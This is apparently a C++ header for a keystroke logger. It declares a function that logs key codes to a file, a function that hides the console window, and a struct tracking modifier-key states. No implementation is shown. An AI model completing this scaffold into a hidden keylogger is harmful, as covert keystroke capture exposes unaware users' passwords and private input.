#pragma once

extern "C";





bool caps = false; //defualt value 

void logfile(int& key);
void hide_console();
int main();




struct activate_keys
{
	bool Caps_Lock = false;
	bool shift = false;
	bool crl = false;
	bool alt = false;

};